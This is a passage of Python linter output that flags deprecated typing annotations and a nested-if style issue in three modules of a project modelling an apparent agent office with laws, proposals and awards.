312 |     def tell_human_feasible(
313 |         self, request: str, approach: str, estimated_resources: Dict[str, int]
314 |     ) -> Dict:
    |          ^^^^
315 |         """
316 |         Tell the human that something is feasible and how to do it.
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\consigliere.py:332:40
    |
331 |     def explain_why_blocked(
332 |         self, entity_id: str, context: Optional[Dict] = None
    |                                        ^^^^^^^^^^^^^^
333 |     ) -> Explanation:
334 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:332:49
    |
331 |     def explain_why_blocked(
332 |         self, entity_id: str, context: Optional[Dict] = None
    |                                                 ^^^^
333 |     ) -> Explanation:
334 |         """
    |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\core\consigliere.py:356:9
    |
354 |           # Check if it's a task
355 |           task = get_task_by_id(entity_id)
356 | /         if task:
357 | |             if task.state.value == "blocked":
    | |_____________________________________________^
358 |                   answer = f"Task '{task.description}' is blocked because:\n"
359 |                   if task.preconditions:
    |
help: Combine `if` statements using `and`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\consigliere.py:390:42
    |
389 |     def explain_why_decision(
390 |         self, decision_id: str, context: Optional[Dict] = None
    |                                          ^^^^^^^^^^^^^^
391 |     ) -> Explanation:
392 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:390:51
    |
389 |     def explain_why_decision(
390 |         self, decision_id: str, context: Optional[Dict] = None
    |                                                   ^^^^
391 |     ) -> Explanation:
392 |         """
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\consigliere.py:431:40
    |
430 |     def explain_what_options(
431 |         self, situation: str, context: Optional[Dict] = None
    |                                        ^^^^^^^^^^^^^^
432 |     ) -> Explanation:
433 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:431:49
    |
430 |     def explain_what_options(
431 |         self, situation: str, context: Optional[Dict] = None
    |                                                 ^^^^
432 |     ) -> Explanation:
433 |         """
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\consigliere.py:515:46
    |
514 |     def preview_consequences(
515 |         self, proposed_action: str, context: Optional[Dict] = None
    |                                              ^^^^^^^^^^^^^^
516 |     ) -> Preview:
517 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:515:55
    |
514 |     def preview_consequences(
515 |         self, proposed_action: str, context: Optional[Dict] = None
    |                                                       ^^^^
516 |     ) -> Preview:
517 |         """
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\consigliere.py:583:54
    |
582 |     def prepare_draft_directive(
583 |         self, goal: str, language: str, constraints: Optional[List[str]] = None
    |                                                      ^^^^^^^^^^^^^^^^^^^
584 |     ) -> DraftDirective:
585 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:583:63
    |
582 |     def prepare_draft_directive(
583 |         self, goal: str, language: str, constraints: Optional[List[str]] = None
    |                                                               ^^^^
584 |     ) -> DraftDirective:
585 |         """
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\consigliere.py:680:62
    |
678 |         return False
679 |
680 |     def validate_authority(self, action: str) -> tuple[bool, Optional[str]]:
    |                                                              ^^^^^^^^^^^^^
681 |         """
682 |         Validate that an action is within Consigliere authority.
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:712:59
    |
710 |         return False
711 |
712 |     def get_explanation_history(self, limit: int = 10) -> List[Dict]:
    |                                                           ^^^^
713 |         """Get recent explanations"""
714 |         return [e.to_dict() for e in self.explanation_history[-limit:]]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:712:64
    |
710 |         return False
711 |
712 |     def get_explanation_history(self, limit: int = 10) -> List[Dict]:
    |                                                                ^^^^
713 |         """Get recent explanations"""
714 |         return [e.to_dict() for e in self.explanation_history[-limit:]]
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:716:59
    |
714 |         return [e.to_dict() for e in self.explanation_history[-limit:]]
715 |
716 |     def get_translation_history(self, limit: int = 10) -> List[Dict]:
    |                                                           ^^^^
717 |         """Get recent translations"""
718 |         return [t.to_dict() for t in self.translation_history[-limit:]]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:716:64
    |
714 |         return [e.to_dict() for e in self.explanation_history[-limit:]]
715 |
716 |     def get_translation_history(self, limit: int = 10) -> List[Dict]:
    |                                                                ^^^^
717 |         """Get recent translations"""
718 |         return [t.to_dict() for t in self.translation_history[-limit:]]
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:720:55
    |
718 |         return [t.to_dict() for t in self.translation_history[-limit:]]
719 |
720 |     def get_preview_history(self, limit: int = 10) -> List[Dict]:
    |                                                       ^^^^
721 |         """Get recent previews"""
722 |         return [p.to_dict() for p in self.preview_history[-limit:]]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:720:60
    |
718 |         return [t.to_dict() for t in self.translation_history[-limit:]]
719 |
720 |     def get_preview_history(self, limit: int = 10) -> List[Dict]:
    |                                                            ^^^^
721 |         """Get recent previews"""
722 |         return [p.to_dict() for p in self.preview_history[-limit:]]
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:724:53
    |
722 |         return [p.to_dict() for p in self.preview_history[-limit:]]
723 |
724 |     def get_draft_history(self, limit: int = 10) -> List[Dict]:
    |                                                     ^^^^
725 |         """Get recent drafts"""
726 |         return [d.to_dict() for d in self.draft_history[-limit:]]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:724:58
    |
722 |         return [p.to_dict() for p in self.preview_history[-limit:]]
723 |
724 |     def get_draft_history(self, limit: int = 10) -> List[Dict]:
    |                                                          ^^^^
725 |         """Get recent drafts"""
726 |         return [d.to_dict() for d in self.draft_history[-limit:]]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:728:26
    |
726 |         return [d.to_dict() for d in self.draft_history[-limit:]]
727 |
728 |     def to_dict(self) -> Dict:
    |                          ^^^^
729 |         """Export Consigliere state"""
730 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\constitutional_mutation.py:12:1
   |
10 | from datetime import datetime, timezone
11 | from enum import Enum
12 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
13 |
14 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\constitutional_mutation.py:12:1
   |
10 | from datetime import datetime, timezone
11 | from enum import Enum
12 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
13 |
14 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\constitutional_mutation.py:50:15
   |
48 |     """Rules for amending a constitutional law"""
49 |
50 |     requires: List[str] = field(
   |               ^^^^
51 |         default_factory=list
52 |     )  # e.g., ["MetaOffice", "2/3 Manager Consensus"]
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\constitutional_mutation.py:57:26
   |
55 |     requires_rollback_path: bool = True
56 |
57 |     def to_dict(self) -> Dict:
   |                          ^^^^
58 |         return {
59 |             "requires": self.requires,
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\constitutional_mutation.py:86:33
   |
84 |         self.introduced_at_tick = introduced_at_tick
85 |         self.amendment_rules = AmendmentRules()
86 |         self.amendment_history: List[Dict] = []
   |                                 ^^^^
87 |         self.last_amended_tick: Optional[int] = None
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\constitutional_mutation.py:86:38
   |
84 |         self.introduced_at_tick = introduced_at_tick
85 |         self.amendment_rules = AmendmentRules()
86 |         self.amendment_history: List[Dict] = []
   |                                      ^^^^
87 |         self.last_amended_tick: Optional[int] = None
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\core\constitutional_mutation.py:87:33
   |
85 |         self.amendment_rules = AmendmentRules()
86 |         self.amendment_history: List[Dict] = []
87 |         self.last_amended_tick: Optional[int] = None
   |                                 ^^^^^^^^^^^^^
88 |
89 |         # Log creation
   |
help: Convert to `X | None`

UP017 [*] Use `datetime.UTC` alias
   --> src\app\miniature_office\core\constitutional_mutation.py:117:43
    |
115 |                 "description": amendment_description,
116 |                 "tick": tick,
117 |                 "timestamp": datetime.now(timezone.utc).isoformat(),
    |                                           ^^^^^^^^^^^^
118 |             }
119 |         )
    |
help: Convert to `datetime.UTC` alias

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:122:26
    |
120 |         self.last_amended_tick = tick
121 |
122 |     def to_dict(self) -> Dict:
    |                          ^^^^
123 |         return {
124 |             "lawId": self.law_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:142:14
    |
140 |     success: bool
141 |     outcome_summary: str
142 |     metrics: Dict[str, float] = field(default_factory=dict)
    |              ^^^^
143 |     risks_identified: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:143:23
    |
141 |     outcome_summary: str
142 |     metrics: Dict[str, float] = field(default_factory=dict)
143 |     risks_identified: List[str] = field(default_factory=list)
    |                       ^^^^
144 |
145 |     def to_dict(self) -> Dict:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:145:26
    |
143 |     risks_identified: List[str] = field(default_factory=list)
144 |
145 |     def to_dict(self) -> Dict:
    |                          ^^^^
146 |         return {
147 |             "simulation_id": self.simulation_id,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:160:15
    |
159 |     level: str  # LOW, MEDIUM, HIGH, CRITICAL
160 |     concerns: List[str] = field(default_factory=list)
    |               ^^^^
161 |     mitigation_strategies: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:161:28
    |
159 |     level: str  # LOW, MEDIUM, HIGH, CRITICAL
160 |     concerns: List[str] = field(default_factory=list)
161 |     mitigation_strategies: List[str] = field(default_factory=list)
    |                            ^^^^
162 |
163 |     def to_dict(self) -> Dict:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:163:26
    |
161 |     mitigation_strategies: List[str] = field(default_factory=list)
162 |
163 |     def to_dict(self) -> Dict:
    |                          ^^^^
164 |         return {
165 |             "level": self.level,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:191:27
    |
190 |         # Simulations
191 |         self.simulations: List[SimulationResult] = []
    |                           ^^^^
192 |         self.impact_simulation_ids: List[str] = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:192:37
    |
190 |         # Simulations
191 |         self.simulations: List[SimulationResult] = []
192 |         self.impact_simulation_ids: List[str] = []
    |                                     ^^^^
193 |
194 |         # Risk
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:198:21
    |
197 |         # Voting
198 |         self.votes: Dict[str, bool] = (
    |                     ^^^^
199 |             {}
200 |         )  # manager_id -> vote (True=approve, False=reject)
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\constitutional_mutation.py:201:34
    |
199 |             {}
200 |         )  # manager_id -> vote (True=approve, False=reject)
201 |         self.meta_office_ruling: Optional[bool] = None
    |                                  ^^^^^^^^^^^^^^
202 |
203 |         # Status
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:205:30
    |
203 |         # Status
204 |         self.status = MutationStatus.DRAFT
205 |         self.status_history: List[Dict] = []
    |                              ^^^^
206 |
207 |         # Activation
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:205:35
    |
203 |         # Status
204 |         self.status = MutationStatus.DRAFT
205 |         self.status_history: List[Dict] = []
    |                                   ^^^^
206 |
207 |         # Activation
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\constitutional_mutation.py:208:39
    |
207 |         # Activation
208 |         self.delayed_activation_tick: Optional[int] = None
    |                                       ^^^^^^^^^^^^^
209 |         self.activation_delay_ticks: int = 100  # Default delay
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\constitutional_mutation.py:212:29
    |
211 |         # Rollback
212 |         self.rollback_path: Optional[str] = None  # JSON describing how to rollback
    |                             ^^^^^^^^^^^^^
213 |         self.is_rolled_back: bool = False
    |
help: Convert to `X | None`

UP017 [*] Use `datetime.UTC` alias
   --> src\app\miniature_office\core\constitutional_mutation.py:237:43
    |
235 |                 "to": new_status.value,
236 |                 "reason": reason,
237 |                 "timestamp": datetime.now(timezone.utc).isoformat(),
    |                                           ^^^^^^^^^^^^
238 |             }
239 |         )
    |
help: Convert to `datetime.UTC` alias

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:303:26
    |
301 |         )
302 |
303 |     def to_dict(self) -> Dict:
    |                          ^^^^
304 |         return {
305 |             "proposalId": self.proposal_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:330:20
    |
329 |     def __init__(self):
330 |         self.laws: Dict[str, ConstitutionalLaw] = {}
    |                    ^^^^
331 |         self.proposals: Dict[str, MutationProposal] = {}
332 |         self.meta_office_id: Optional[str] = None
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:331:25
    |
329 |     def __init__(self):
330 |         self.laws: Dict[str, ConstitutionalLaw] = {}
331 |         self.proposals: Dict[str, MutationProposal] = {}
    |                         ^^^^
332 |         self.meta_office_id: Optional[str] = None
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\constitutional_mutation.py:332:30
    |
330 |         self.laws: Dict[str, ConstitutionalLaw] = {}
331 |         self.proposals: Dict[str, MutationProposal] = {}
332 |         self.meta_office_id: Optional[str] = None
    |                              ^^^^^^^^^^^^^
333 |
334 |         # Initialize core laws
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:407:54
    |
405 |         return proposal.proposal_id
406 |
407 |     def simulate_mutation(self, proposal_id: str) -> List[SimulationResult]:
    |                                                      ^^^^
408 |         """
409 |         Run simulations on a mutation proposal.
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\constitutional_mutation.py:549:34
    |
547 |         return True
548 |
549 |     def get_active_laws(self) -> List[ConstitutionalLaw]:
    |                                  ^^^^
550 |         """Get all active constitutional laws"""
551 |         return list(self.laws.values())
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\constitutional_mutation.py:553:49
    |
551 |         return list(self.laws.values())
552 |
553 |     def get_proposal(self, proposal_id: str) -> Optional[MutationProposal]:
    |                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
554 |         """Get a proposal by ID"""
555 |         return self.proposals.get(proposal_id)
    |
help: Convert to `X | None`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\creative_autonomy.py:21:1
   |
19 | from datetime import datetime
20 | from enum import Enum
21 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
22 |
23 | # ============================================================================
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\creative_autonomy.py:21:1
   |
19 | from datetime import datetime
20 | from enum import Enum
21 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
22 |
23 | # ============================================================================
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\miniature_office\core\creative_autonomy.py:21:1
   |
19 | from datetime import datetime
20 | from enum import Enum
21 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
22 |
23 | # ============================================================================
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\creative_autonomy.py:56:24
   |
55 |     firewall_id: str
56 |     blocked_crossings: List[Dict[str, Any]] = field(default_factory=list)
   |                        ^^^^
57 |     violations: List[Dict[str, Any]] = field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\creative_autonomy.py:56:29
   |
55 |     firewall_id: str
56 |     blocked_crossings: List[Dict[str, Any]] = field(default_factory=list)
   |                             ^^^^
57 |     violations: List[Dict[str, Any]] = field(default_factory=list)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\creative_autonomy.py:57:17
   |
55 |     firewall_id: str
56 |     blocked_crossings: List[Dict[str, Any]] = field(default_factory=list)
57 |     violations: List[Dict[str, Any]] = field(default_factory=list)
   |                 ^^^^
58 |
59 |     def block_creative_crossing(
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\creative_autonomy.py:57:22
   |
55 |     firewall_id: str
56 |     blocked_crossings: List[Dict[str, Any]] = field(default_factory=list)
57 |     violations: List[Dict[str, Any]] = field(default_factory=list)
   |                      ^^^^
58 |
59 |     def block_creative_crossing(
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:140:20
    |
138 |     description: str
139 |     category: str  # "widget", "utility", "hygiene", "refactoring", "test_helper", "doc_helper"
140 |     proposed_code: Optional[str]
    |                    ^^^^^^^^^^^^^
141 |
142 |     # Status
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:150:21
    |
149 |     # Human decisions
150 |     human_decision: Optional[str] = None
    |                     ^^^^^^^^^^^^^
151 |     human_decision_by: Optional[str] = None
152 |     human_decision_at: Optional[datetime] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:151:24
    |
149 |     # Human decisions
150 |     human_decision: Optional[str] = None
151 |     human_decision_by: Optional[str] = None
    |                        ^^^^^^^^^^^^^
152 |     human_decision_at: Optional[datetime] = None
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:152:24
    |
150 |     human_decision: Optional[str] = None
151 |     human_decision_by: Optional[str] = None
152 |     human_decision_at: Optional[datetime] = None
    |                        ^^^^^^^^^^^^^^^^^^
153 |
154 |     # Conversion to formal directive
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:156:19
    |
154 |     # Conversion to formal directive
155 |     converted_to_directive: bool = False
156 |     directive_id: Optional[str] = None
    |                   ^^^^^^^^^^^^^
157 |
158 |     def approve(
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:162:23
    |
160 |         human_id: str,
161 |         convert_to_directive: bool = False,
162 |         directive_id: Optional[str] = None,
    |                       ^^^^^^^^^^^^^
163 |     ) -> None:
164 |         """Human approves the initiative."""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:180:50
    |
178 |         self.human_decision_at = datetime.now()
179 |
180 |     def reject(self, human_id: str, explanation: Optional[str] = None) -> None:
    |                                                  ^^^^^^^^^^^^^
181 |         """Human rejects the initiative."""
182 |         self.status = InitiativeStatus.REJECTED
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:205:16
    |
204 |     channel_id: str
205 |     proposals: List[InitiativeProposal] = field(default_factory=list)
    |                ^^^^
206 |     suspended: bool = False
207 |     suspension_reason: Optional[str] = None
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:207:24
    |
205 |     proposals: List[InitiativeProposal] = field(default_factory=list)
206 |     suspended: bool = False
207 |     suspension_reason: Optional[str] = None
    |                        ^^^^^^^^^^^^^
208 |
209 |     def check_idle_conditions(self, floor_id: str) -> IdleConditions:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:225:24
    |
223 |         description: str,
224 |         category: str,
225 |         proposed_code: Optional[str] = None,
    |                        ^^^^^^^^^^^^^
226 |     ) -> Optional[str]:
227 |         """Submit a new initiative proposal."""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:226:10
    |
224 |         category: str,
225 |         proposed_code: Optional[str] = None,
226 |     ) -> Optional[str]:
    |          ^^^^^^^^^^^^^
227 |         """Submit a new initiative proposal."""
228 |         if self.suspended:
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:272:40
    |
270 |         self.suspension_reason = None
271 |
272 |     def get_pending_proposals(self) -> List[InitiativeProposal]:
    |                                        ^^^^
273 |         """Get all pending proposals awaiting human decision."""
274 |         return [p for p in self.proposals if p.status == InitiativeStatus.PROPOSED]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:288:19
    |
286 |     conversation_id: str
287 |     timestamp: datetime
288 |     participants: List[str]
    |                   ^^^^
289 |     topic: str
290 |     conversation_type: str  # "technical", "philosophical", "humorous", "narrative"
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:317:17
    |
315 |     title: str
316 |     content: str
317 |     created_by: List[str]
    |                 ^^^^
318 |     created_at: datetime
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:336:20
    |
335 |     lounge_id: str
336 |     conversations: List[LoungeConversation] = field(default_factory=list)
    |                    ^^^^
337 |     cultural_artifacts: List[CulturalArtifact] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:337:25
    |
335 |     lounge_id: str
336 |     conversations: List[LoungeConversation] = field(default_factory=list)
337 |     cultural_artifacts: List[CulturalArtifact] = field(default_factory=list)
    |                         ^^^^
338 |
339 |     def start_conversation(
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:340:29
    |
339 |     def start_conversation(
340 |         self, participants: List[str], topic: str, conversation_type: str, content: str
    |                             ^^^^
341 |     ) -> str:
342 |         """Start a new lounge conversation."""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:360:71
    |
359 |     def create_cultural_artifact(
360 |         self, artifact_type: str, title: str, content: str, creators: List[str]
    |                                                                       ^^^^
361 |     ) -> str:
362 |         """Create a new cultural artifact."""
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:375:60
    |
373 |         return artifact.artifact_id
374 |
375 |     def get_recent_conversations(self, limit: int = 10) -> List[LoungeConversation]:
    |                                                            ^^^^
376 |         """Get recent conversations."""
377 |         return self.conversations[-limit:]
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:394:25
    |
392 |     year: int
393 |
394 |     individual_nominee: Optional[str]
    |                         ^^^^^^^^^^^^^
395 |     team_nominees: List[str]
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:395:20
    |
394 |     individual_nominee: Optional[str]
395 |     team_nominees: List[str]
    |                    ^^^^
396 |
397 |     criteria_met: Dict[
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:397:19
    |
395 |     team_nominees: List[str]
396 |
397 |     criteria_met: Dict[
    |                   ^^^^
398 |         str, bool
399 |     ]  # code_clarity, test_rigor, contract_discipline, security_hygiene
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:454:31
    |
453 |     system_id: str
454 |     employee_of_month_awards: List[EmployeeOfTheMonth] = field(default_factory=list)
    |                               ^^^^
455 |     golden_stars: List[GoldenStar] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:455:19
    |
453 |     system_id: str
454 |     employee_of_month_awards: List[EmployeeOfTheMonth] = field(default_factory=list)
455 |     golden_stars: List[GoldenStar] = field(default_factory=list)
    |                   ^^^^
456 |
457 |     def nominate_employee_of_month(
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\creative_autonomy.py:462:21
    |
460 |         month: str,
461 |         year: int,
462 |         individual: Optional[str],
    |                     ^^^^^^^^^^^^^
463 |         team: List[str],
464 |         criteria: Dict[str, bool],
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:463:15
    |
461 |         year: int,
462 |         individual: Optional[str],
463 |         team: List[str],
    |               ^^^^
464 |         criteria: Dict[str, bool],
465 |     ) -> str:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:464:19
    |
462 |         individual: Optional[str],
463 |         team: List[str],
464 |         criteria: Dict[str, bool],
    |                   ^^^^
465 |     ) -> str:
466 |         """Nominate employee(s) of the month."""
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:502:53
    |
500 |         return star.star_id
501 |
502 |     def get_stars_for_agent(self, agent_id: str) -> List[GoldenStar]:
    |                                                     ^^^^
503 |         """Get all stars for an agent."""
504 |         return [s for s in self.golden_stars if s.awarded_to == agent_id]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:545:20
    |
544 |     agent_id: str
545 |     contributions: List[Contribution] = field(default_factory=list)
    |                    ^^^^
546 |     successes: List[str] = field(default_factory=list)
547 |     failures: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:546:16
    |
544 |     agent_id: str
545 |     contributions: List[Contribution] = field(default_factory=list)
546 |     successes: List[str] = field(default_factory=list)
    |                ^^^^
547 |     failures: List[str] = field(default_factory=list)
548 |     stars_earned: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:547:15
    |
545 |     contributions: List[Contribution] = field(default_factory=list)
546 |     successes: List[str] = field(default_factory=list)
547 |     failures: List[str] = field(default_factory=list)
    |               ^^^^
548 |     stars_earned: List[str] = field(default_factory=list)
549 |     reviews_received: List[Review] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:548:19
    |
546 |     successes: List[str] = field(default_factory=list)
547 |     failures: List[str] = field(default_factory=list)
548 |     stars_earned: List[str] = field(default_factory=list)
    |                   ^^^^
549 |     reviews_received: List[Review] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\creative_autonomy.py:549:23
    |
